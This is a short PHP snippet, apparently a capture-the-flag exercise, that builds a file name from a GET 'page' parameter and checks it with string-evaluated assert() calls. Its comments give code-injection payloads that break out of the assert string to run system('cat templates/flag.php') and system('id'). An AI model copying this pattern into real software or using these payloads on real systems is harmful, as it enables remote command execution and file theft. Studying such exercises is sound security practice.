<?php
// strpos('').system("id"); 注意这种绕过方法
if(isset($_GET['page'])){
    $page = $_GET['page'];
    $file = $page . ".php";
    echo $file .PHP_EOL;
    // payload1=abc') or system("cat templates/flag.php");//
    // payload2=').system("cat templates/flag.php");//
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
    assert("file_exists('$file')" or die("file dosen't exist!"));
}
?>